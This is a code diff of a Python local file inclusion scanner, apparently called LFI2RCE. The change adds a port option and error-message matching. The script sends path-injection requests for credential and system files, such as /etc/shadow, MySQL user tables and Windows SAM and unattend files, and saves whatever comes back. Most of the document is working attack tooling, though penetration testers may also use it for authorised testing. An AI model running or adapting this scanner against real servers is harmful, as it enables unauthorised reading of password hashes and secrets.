@@ -3,15 +3,6 @@ import requests
 import urllib3
 import os
 
-# add username and make custom filename
-# make more readable file output like color
-# add /proc/fd/1
-# add banner
-# coloring in debug option
-# add windows file?
-# add PHP SESSIONID
-# add error message
-
 class Color:
     BLACK     = '\033[30m'
     RED       = '\033[31m'
@@ -47,9 +38,10 @@ parser.add_argument('--ssl', action='store_true', default=False, help='Use SSL f
 parser.add_argument('--dir-file', type=str, default=None, help='Input file for directory brute force')
 parser.add_argument('--windows', action='store_true', default=False, help='Windows server')
 parser.add_argument('--linux', action='store_true', default=False, help='linux server')
-parser.add_argument('--username', type=str, default=None, help='enter username if you know')
+parser.add_argument('--username', type=str, default=None, help='enter username if you know.')
 parser.add_argument('--debug', action='store_true', default=False, help='Complete setup without running against host')
-parser.add_argument('--error', type=str, default='', help='Enter Error Messgage. Example: No such file or directory')
+parser.add_argument('--error', type=str, default='', help='Enter Error Messgage. Example: \"No such file or directory\" \"failed to open stream\"')
+parser.add_argument('-p', '--port', type=str, default=None, help='Target port. Default: http 80 https 443')
 parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Verbose output')
 parser.add_argument('-k', '--verify-ssl', action='store_true', default=False, help='Verify SSL certificates')
 parser.add_argument('-o', '--outdir', type=str, default=None, help="Write output to this directory")
@@ -65,6 +57,9 @@ prefix = "https://" if ssl else "http://"
 suffix = "%00" if args.nullbyte else ""
 base_path = args.path
 host = args.host
+if args.port:
+    host = host + ":" + args.port
+    print(host)
 lfi_path_example = Color.YELLOW + "{}{}{}<INJECTION POINT>{}".format(prefix, host, base_path, suffix)+ Color.END
 
 verbose = args.verbose
@@ -81,7 +76,7 @@ if verbose:
     print(Color.GREEN+"Base Injection Path: %s" % base_path + Color.END)
     print(Color.GREEN+"Terminator: %s" % suffix + Color.END)
     print(Color.GREEN+"LFI path: %s" % lfi_path_example + Color.END)
-
+    print(Color.GREEN+"Error Message: %s" % errormes + Color.END)
 LINUX_FILES = [
     "/etc/passwd",
     "/etc/shadow",
@@ -109,8 +104,6 @@ LINUX_FILES = [
     "/var/lib/mysql/mysql/usr.frm",
     "/var/lib/mysql/user.MYD",
     "/var/lib/mysql/user.MYI",
-    #Add some file
-
     "/var/log/apache/logs/error.log",
     "/var/log/apache/logs/access.log",
     "/etc/httpd/logs/acces_log",
@@ -153,17 +146,14 @@ WINDOWS_FILES = [
     "/windows/repair/SAM"
     "/windows/panther/unattended.xml",
     "/windows/panther/unattend/unattended.xml",
-    #Add some 
     "/WINDOWS/repair/sam",
     "/WINDOWS/repair/system"
 ]
 
 if args.dir_file:
     file_name = args.dir_file
-#    print "[+] args.dir_file !"
     file_data = open(file_name,"r")
     files = [s.strip() for s in file_data.readlines()]
-#    print(files)
 elif args.windows:
     files = WINDOWS_FILES
 elif args.linux:
@@ -185,10 +175,14 @@ for f in files:
         continue
     resp = session.get(url, verify=verify_ssl)
     if resp.content and resp.status_code != 404:
+        if errormes == '' and len(resp.content)>0:
+            print(Color.RED + "LFI Success! {} file found.".format(f) + Color.END)
+            file_found.append(f)
+            if outdir:
+                save_file_at_new_dir(outdir, f.split('/')[-1], resp.content)
         if not errormes in resp.content:
             print(Color.RED + "LFI Success! {} file found.".format(f) + Color.END)
             file_found.append(f)
-#            print(f.split('/')[-1])
             if outdir:
                 save_file_at_new_dir(outdir, f.split('/')[-1], resp.content)
         if verbose and show:
@@ -197,4 +191,4 @@ for f in files:
 print(Color.GREEN + "Following files found!!!" + Color.END)
 for found in file_found:
     print(Color.RED + found + Color.END)
-print("Done!")
+print("LFI2RCE finished!")
